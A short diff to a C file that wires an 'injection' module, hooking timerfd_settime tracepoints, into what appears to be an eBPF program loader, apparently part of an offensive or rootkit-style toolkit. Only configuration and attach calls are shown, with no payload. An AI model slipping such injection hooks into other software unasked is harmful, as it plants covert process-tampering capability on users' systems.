@@ -3,6 +3,7 @@
 #include "sched.h"
 #include "fs.h"
 #include "exec.h"
+#include "injection.h"
 
 module_config_t module_config = {
     .xdp_module = {
@@ -22,6 +23,11 @@ module_config_t module_config = {
     .exec_module = {
         .all = ON,
         .tp_sys_enter_execve = OFF
+    },
+    .injection_module = {
+        .all = ON,
+        .sys_enter_timerfd_settime = OFF,
+        .sys_exit_timerfd_settime = OFF
     }
 
 };
@@ -34,7 +40,8 @@ module_config_attr_t module_config_attr = {
     },
     .sched_module = {},
     .fs_module = {},
-    .exec_module = {}
+    .exec_module = {},
+    .injection_module = {}
 };
 
 
@@ -78,6 +85,14 @@ int setup_all_modules(){
     }
     if(ret!=0) return -1;
 
+    //INJECTION
+    if(config.injection_module.all == ON){
+        ret = attach_injection_all(attr.skel);
+    }else{
+        if(config.injection_module.sys_enter_timerfd_settime == ON) ret = attach_sys_enter_timerfd_settime(attr.skel);
+        if(config.injection_module.sys_exit_timerfd_settime == ON) ret = attach_sys_exit_timerfd_settime(attr.skel);
+    }
+    if(ret!=0) return -1;
 
     return 0;
 }
